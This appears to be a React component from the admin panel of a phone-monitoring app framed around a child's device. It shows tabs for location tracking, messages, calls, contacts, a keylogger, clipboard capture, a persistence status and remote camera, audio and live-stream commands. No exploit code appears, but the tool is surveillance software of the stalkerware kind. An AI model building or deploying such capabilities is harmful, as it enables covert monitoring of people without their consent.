// components/admin/devices/DeviceTabViews.tsx
"use client";

import React from "react";
import { MonitoredDevice, DeviceLocation, DeviceContact, DeviceCall, DeviceMessage, DeviceFileItem } from "@/lib/device-types";
import { DeviceMapTracker } from "@/components/admin/devices/DeviceMapTracker";
import { DeviceCameraGallery } from "@/components/admin/devices/DeviceCameraGallery";
import { DeviceAudioGallery, AudioCapture } from "@/components/admin/devices/DeviceAudioGallery";
import { DeviceContactsTable } from "@/components/admin/devices/DeviceContactsTable";
import { DeviceCallLogsList } from "@/components/admin/devices/DeviceCallLogsList";
import { DeviceMessagesFeed } from "@/components/admin/devices/DeviceMessagesFeed";
import { DeviceAppsTab } from "@/components/admin/devices/DeviceAppsTab";
import { DeviceLiveStreamPanel } from "@/components/admin/devices/DeviceLiveStreamPanel";
import { DeviceGalleryTab } from "@/components/admin/devices/DeviceGalleryTab";
import { DeviceIntelligenceTabViews } from "@/components/admin/devices/DeviceIntelligenceTabViews";
import { DeviceFetchButton } from "@/components/admin/devices/DeviceFetchButton";
import { ToggleLeft, ToggleRight, RefreshCw } from "lucide-react";

interface Props {
  activeTab: string;
  device: MonitoredDevice;
  locations: DeviceLocation[];
  contacts: DeviceContact[];
  calls: DeviceCall[];
  messages: DeviceMessage[];
  captures: any[];
  audioClips: AudioCapture[];
  files: DeviceFileItem[];
  notifications?: any[];
  keystrokes?: any[];
  clipboardItems?: any[];
  lockEvents?: any[];
  wifiNetworks?: any[];
  currentSsid?: string | null;
  persistenceStatus?: any;
  onClearModule?: (mod: string) => void;
  filesLoading?: boolean;
  tabLoading?: boolean;
  isLiveMovement?: boolean;
  isTabEnabled?: boolean;
  onToggleTab?: () => void;
  onFetchOnce?: () => void;
  onToggleLiveMovement?: (active: boolean) => void;
  onSendCommand: (cmd: string, payload?: any, label?: string) => void;
  onDeleteCommand: (id: string) => void;
  onBulkDeleteCommands?: (type: "take_photo" | "record_audio") => void;
  onDeleteContact?: (id: string) => void; onDeleteCall?: (id: string) => void;
  onDeleteMessage?: (id: string) => void; onDeleteApp?: (id: string) => void; onDeleteFile?: (id: string) => void;
  onBulkDeleteContacts?: () => void; onBulkDeleteCalls?: () => void;
  onBulkDeleteMessages?: () => void; onBulkDeleteApps?: () => void; onBulkDeleteFiles?: () => void;
}

const TOGGLEABLE_TABS = ["gallery", "contacts", "calls", "messages", "apps", "camera", "audio", "notifications", "keylogger", "clipboard", "security"];

export const DeviceTabViews: React.FC<Props> = ({
  activeTab, device, locations, contacts, calls, messages, captures, audioClips,
  files, notifications = [], keystrokes = [], clipboardItems = [], lockEvents = [], wifiNetworks = [],
  currentSsid, persistenceStatus, onClearModule, filesLoading, tabLoading, isLiveMovement,
  isTabEnabled = false, onToggleTab, onFetchOnce, onToggleLiveMovement, onSendCommand,
  onDeleteCommand, onBulkDeleteCommands, onDeleteContact, onDeleteCall, onDeleteMessage,
  onDeleteApp, onDeleteFile, onBulkDeleteContacts, onBulkDeleteCalls, onBulkDeleteMessages,
  onBulkDeleteApps, onBulkDeleteFiles,
}) => {
  const showToggle = TOGGLEABLE_TABS.includes(activeTab);
  const hasData = (
    (activeTab === "contacts" && contacts.length > 0) ||
    (activeTab === "calls" && calls.length > 0) ||
    (activeTab === "messages" && messages.length > 0) ||
    (activeTab === "gallery" && files.length > 0) ||
    (activeTab === "camera" && captures.length > 0) ||
    (activeTab === "audio" && audioClips.length > 0) ||
    (activeTab === "apps" && ((device as any)?.counts?.apps ?? 0) > 0) ||
    (activeTab === "notifications" && notifications.length > 0) ||
    (activeTab === "keylogger" && keystrokes.length > 0) ||
    (activeTab === "clipboard" && clipboardItems.length > 0) ||
    (activeTab === "security" && (lockEvents.length > 0 || wifiNetworks.length > 0))
  );

  return (
    <div className="p-3.5 sm:p-5 rounded-2xl sm:rounded-3xl bg-white dark:bg-[#0B0B0E] border border-slate-200 dark:border-white/10 shadow-xl">
      {/* Universal Top Controls: Toggle + Fetch Once + Loading Status */}
      {showToggle && (
        <div className="flex flex-wrap items-center justify-between gap-2 mb-4 pb-3 border-b border-white/5">
          <div className="flex items-center gap-2">
            {onToggleTab && (
              <button
                onClick={onToggleTab}
                className={`flex items-center gap-1.5 py-1.5 px-2.5 rounded-xl text-xs font-bold transition-all border ${
                  isTabEnabled ? "bg-emerald-500/15 border-emerald-500/30 text-emerald-400" : "bg-white/5 border-white/10 text-white/50 hover:text-white"
                }`}
              >
                {isTabEnabled ? <ToggleRight className="w-4 h-4 text-emerald-400" /> : <ToggleLeft className="w-4 h-4 text-white/40" />}
                <span>{isTabEnabled ? "Auto: ON" : "Auto: OFF"}</span>
              </button>
            )}
            {onFetchOnce && (
              <DeviceFetchButton onFetch={onFetchOnce} loading={tabLoading} />
            )}
          </div>
          {tabLoading && (
            <div className="flex items-center gap-1.5 text-[10px] text-[#FFFC00] font-mono">
              <RefreshCw className="w-3 h-3 animate-spin" /> Loading...
            </div>
          )}
        </div>
      )}

      {/* Empty State when Tab is Disabled AND Has Zero Data Yet */}
      {showToggle && !isTabEnabled && !hasData ? (
        <div className="p-8 rounded-2xl bg-white/[0.02] border border-white/10 text-center space-y-2.5">
          <div className="w-10 h-10 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center mx-auto text-white/30">
            <ToggleLeft className="w-5 h-5" />
          </div>
          <h4 className="text-xs font-bold text-white/70">Auto-Fetch Disabled</h4>
          <p className="text-[11px] text-white/40 max-w-xs mx-auto">
            Zero database or battery load. Enable auto-sync or fetch on-demand.
          </p>
          <div className="flex items-center justify-center gap-2 pt-1">
            {onToggleTab && (
              <button onClick={onToggleTab} className="py-1.5 px-3 rounded-xl bg-emerald-500/20 hover:bg-emerald-500/30 border border-emerald-500/40 text-emerald-300 text-xs font-bold transition-all">
                Enable Auto
              </button>
            )}
            {onFetchOnce && (
              <DeviceFetchButton onFetch={onFetchOnce} loading={tabLoading} className="py-1.5 px-3 bg-white/10 border-white/20 text-white" />
            )}
          </div>
        </div>
      ) : (
        <>
          {activeTab === "map" && (
            <DeviceMapTracker
              locations={locations}
              childName={device.child_name}
              isLiveMovement={isLiveMovement}
              onToggleLiveMovement={onToggleLiveMovement}
              onFetchLocation={() => onSendCommand("fetch_location", {}, "Location fetch request")}
            />
          )}
          {activeTab === "camera" && (
            <DeviceCameraGallery captures={captures} onTriggerSnap={(cam) => onSendCommand("take_photo", { camera: cam }, `${cam} snap`)} onDeleteSnap={onDeleteCommand} onBulkDeleteSnaps={() => onBulkDeleteCommands?.("take_photo")} />
          )}
          {activeTab === "audio" && (
            <DeviceAudioGallery audioClips={audioClips} onTriggerAudio={(dur) => onSendCommand("record_audio", { duration: dur }, `${dur}s audio recording`)} onDeleteAudio={onDeleteCommand} onBulkDeleteAudio={() => onBulkDeleteCommands?.("record_audio")} />
          )}
          {activeTab === "apps" && (
            <DeviceAppsTab deviceId={device.id} onDeleteApp={onDeleteApp} onSync={() => onSendCommand("sync_apps", {}, "Apps sync")} onBulkDelete={onBulkDeleteApps} />
          )}
          {activeTab === "contacts" && (
            <DeviceContactsTable contacts={contacts} onDeleteContact={onDeleteContact} onSync={() => onSendCommand("sync_contacts", {}, "Contacts sync")} onBulkDelete={onBulkDeleteContacts} />
          )}
          {activeTab === "calls" && (
            <DeviceCallLogsList calls={calls} onDeleteCall={onDeleteCall} onSync={() => onSendCommand("sync_calls", {}, "Calls sync")} onBulkDelete={onBulkDeleteCalls} />
          )}
          {activeTab === "messages" && (
            <DeviceMessagesFeed messages={messages} onDeleteMessage={onDeleteMessage} onSync={() => onSendCommand("sync_messages", {}, "SMS sync")} onBulkDelete={onBulkDeleteMessages} />
          )}
          {activeTab === "stream" && (
            <DeviceLiveStreamPanel deviceId={device.id} childName={device.child_name} isOnline={device.is_online} onSendCommand={onSendCommand} />
          )}
          {activeTab === "gallery" && (
            <DeviceGalleryTab
              deviceId={device.id} files={files} loading={filesLoading}
              onSyncGallery={() => onSendCommand("sync_gallery", {}, "Sync Gallery")}
              onSendCommand={onSendCommand} onDeleteFile={onDeleteFile} onBulkDeleteFiles={onBulkDeleteFiles}
            />
          )}
          {["notifications", "keylogger", "clipboard", "security"].includes(activeTab) && (
            <DeviceIntelligenceTabViews
              activeTab={activeTab}
              notifications={notifications}
              keystrokes={keystrokes}
              clipboardItems={clipboardItems}
              lockEvents={lockEvents}
              wifiNetworks={wifiNetworks}
              currentSsid={currentSsid}
              persistenceStatus={persistenceStatus}
              onClearModule={onClearModule}
              onScanWifi={() => onSendCommand("sync_wifi", {}, "WiFi scan")}
              loading={tabLoading}
            />
          )}
        </>
      )}
    </div>
  );
};
